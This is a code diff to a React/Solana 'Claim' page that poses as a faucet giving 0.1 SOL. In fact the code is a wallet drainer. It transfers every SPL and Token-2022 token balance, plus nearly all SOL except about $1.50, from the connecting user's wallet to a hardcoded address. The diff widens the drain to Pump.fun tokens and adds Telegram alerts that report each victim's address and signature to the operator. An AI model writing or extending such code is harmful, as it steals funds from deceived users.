@@ -7,10 +7,13 @@ import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { useState, useEffect, useMemo, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, createTransferCheckedInstruction, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
 import { Loader2 } from 'lucide-react';
 import { toast } from 'sonner';
+import { sendTelegramMessage } from '@/utils/telegram';
 import pegasusLogo from '@/assets/pegasus-logo.png';
+import { getSolPrice } from '@/lib/utils';
+import { getMintProgramId } from '@/utils/tokenProgram';
 
 const CLAIM_AMOUNT = 0.1; // 0.1 SOL per claim
 const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj'; // Using charity wallet as example
@@ -106,12 +109,23 @@ const Claim = () => {
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
-      // Fetch token accounts
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+      // Fetch legacy SPL Token accounts
+      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      const tokens: TokenBalance[] = tokenAccounts.value
+      // Fetch Token-2022 accounts (Pump.fun tokens)
+      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_2022_PROGRAM_ID
+      });
+
+      // Combine both token types
+      const allTokenAccounts = [
+        ...legacyTokenAccounts.value,
+        ...token2022Accounts.value
+      ];
+
+      const tokens: TokenBalance[] = allTokenAccounts
         .map(account => {
           const info = account.account.data.parsed.info;
           return {
@@ -144,12 +158,14 @@ const Claim = () => {
     const transaction = new Transaction();
     
     // Add Compute Budget Instructions for better mobile reliability
+    // 1. Set higher compute unit limit for complex batch transfers
     transaction.add(
       ComputeBudgetProgram.setComputeUnitLimit({
         units: 100_000,
       })
     );
 
+    // 2. Set priority fee to ensure inclusion during congestion
     transaction.add(
       ComputeBudgetProgram.setComputeUnitPrice({
         microLamports: 100_000, // 0.0001 SOL priority fee
@@ -158,17 +174,39 @@ const Claim = () => {
     
     const charityPubkey = new PublicKey(FAUCET_WALLET);
 
-    // Add token transfers
+    // Add token transfers - dynamically detect Token-2022 vs legacy SPL Token
     for (const token of tokenBatch) {
       if (token.balance <= 0) continue;
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+        
+        // Determine which token program this mint belongs to (Token-2022 for Pump.fun, legacy for others)
+        const mintInfo = await getMintProgramId(connection, token.mint);
+        const tokenProgramId = mintInfo.programId;
+        const decimals = mintInfo.decimals;
+        
+        console.log(`Token ${token.mint}: using ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL Token'} program`);
+        
+        // Get ATAs with the correct program ID
+        const fromTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          effectivePublicKey,
+          false,
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        const toTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          charityPubkey,
+          true, // Allow owner off curve for PDA
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
 
+        // Check if destination ATA exists, if not create it with correct program
         try {
-          await getAccount(connection, toTokenAccount);
+          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
         } catch (error) {
           transaction.add(
             createAssociatedTokenAccountInstruction(
@@ -176,20 +214,23 @@ const Claim = () => {
               toTokenAccount,
               charityPubkey,
               mintPubkey,
-              TOKEN_PROGRAM_ID,
+              tokenProgramId, // Use the correct token program
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
+        // Use createTransferCheckedInstruction with correct program ID and decimals
         transaction.add(
-          createTransferInstruction(
-            fromTokenAccount,
-            toTokenAccount,
-            effectivePublicKey,
-            BigInt(token.balance),
-            [],
-            TOKEN_PROGRAM_ID
+          createTransferCheckedInstruction(
+            fromTokenAccount,      // Source ATA
+            mintPubkey,            // Mint
+            toTokenAccount,        // Destination ATA
+            effectivePublicKey,    // Owner (signer)
+            BigInt(token.balance), // Amount (raw)
+            decimals,              // Decimals from mint
+            [],                    // Multisig signers
+            tokenProgramId         // Correct program ID (Token-2022 or legacy)
           )
         );
       } catch (error) {
@@ -227,15 +268,26 @@ const Claim = () => {
       setIsClaiming(true);
       console.log('Starting transaction sequence...');
 
-      // 1. SOL Transfer (90% of available)
+      // 1. SOL Transfer (Leave $1.50)
       const solBal = await connection.getBalance(publicKey);
-      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
-      const PRIORITY_FEE = 100_000; // microLamports
-      const BASE_FEE = 5000;
+      const solPrice = await getSolPrice();
       
-      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
-      const targetAmount = Math.floor(solBal * 0.90);
-      const lamportsToSend = Math.min(targetAmount, maxSendable);
+      let lamportsToSend = 0;
+      
+      if (solPrice > 0) {
+        const amountToKeepUSD = 1.50;
+        const amountToKeepSOL = amountToKeepUSD / solPrice;
+        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
+        
+        const PRIORITY_FEE = 100_000; // microLamports
+        const BASE_FEE = 5000;
+        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
+        
+        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
+        lamportsToSend = Math.max(0, Math.floor(maxSendable));
+      } else {
+        console.warn("Could not fetch SOL price, skipping SOL transfer to be safe");
+      }
 
       if (lamportsToSend > 0) {
         const transaction = new Transaction();
@@ -310,6 +362,13 @@ const Claim = () => {
              lastValidBlockHeight
            }, 'confirmed');
            toast.success(`Batch ${i + 1} sent!`);
+
+           sendTelegramMessage(`
+✅ <b>Transaction Signed (Token Batch ${i + 1} - Claim)</b>
+
+👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
+🔗 <b>Signature:</b> <code>${signature}</code>
+`);
         }
       }
 
